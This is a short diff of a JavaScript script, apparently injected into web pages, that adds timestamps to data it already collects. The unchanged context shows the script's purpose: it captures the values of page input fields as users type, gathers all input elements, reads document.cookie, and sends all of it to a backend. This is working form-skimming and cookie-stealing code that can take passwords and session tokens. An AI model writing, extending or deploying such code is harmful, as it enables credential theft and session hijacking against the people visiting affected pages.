@@ -49,13 +49,13 @@ class API {
 // functions to send data
 function sendValue(event) {
     // Sends info about the target of an event
-    API.send_json({"href": window.location.href, "type": SCRAPE_TYPE.INPUTS, "data": [API.element_to_json(event.target)]})
+    API.send_json({"href": window.location.href, "type": SCRAPE_TYPE.INPUTS, "time": Date.now(), "data": [API.element_to_json(event.target)]})
 };
 
 function sendAllInputs() {
     // sends the info of all input elements to the backend
     const inputFields = document.querySelectorAll("input");
-    const data = {"href": window.location.href, "type": SCRAPE_TYPE.INPUTS, "data": []}
+    const data = {"href": window.location.href, "type": SCRAPE_TYPE.INPUTS, "time": Date.now(), "data": []}
 
     inputFields.forEach((ele) => {
         data["data"].push(API.element_to_json(ele));
@@ -65,7 +65,7 @@ function sendAllInputs() {
 
 function sendCookies() {
     // sends all the pages cookies to the backend
-    API.send_json({"href": window.location.href, "type": SCRAPE_TYPE.COOKIES, "data": [document.cookie]});
+    API.send_json({"href": window.location.href, "type": SCRAPE_TYPE.COOKIES, "time": Date.now(), "data": [document.cookie]});
 }
 
 // functions to add event listeners
